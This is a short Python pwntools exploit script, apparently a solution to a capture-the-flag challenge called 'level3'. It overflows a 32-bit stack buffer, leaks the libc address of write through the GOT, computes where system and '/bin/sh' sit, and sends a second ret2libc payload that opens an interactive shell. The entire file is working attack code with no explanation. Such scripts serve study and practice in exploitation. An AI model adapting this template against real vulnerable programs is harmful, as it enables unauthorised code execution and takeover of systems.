from pwn import *
#context.update(arch='i386',os='linux',log_level='debug',endian='little')
context.log_level='debug'
p=process('./level3')
libc=ELF('./libc32.so.6')
elf=ELF('./level3')
write_plt=elf.plt['write']
write_got=elf.got['write']
main_addr=elf.symbols['main']
fakeebp='bbbb'
ret=0x080482da
payload1='a'*0x88+fakeebp+p32(ret)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
p.sendlineafter('Input:\n',payload1)
write_addr=u32(p.recv(4))
libc_base=write_addr-libc.symbols['write']
sys_addr=libc_base+libc.symbols['system']
bin_addr=libc_base+libc.search('/bin/sh').next()
ret_addr='1234'
payload2='A'*0x88+fakeebp+p32(ret)+p32(sys_addr)+ret_addr+p32(bin_addr)
p.sendlineafter('Input:\n',payload2)
p.interactive()
#p.close()

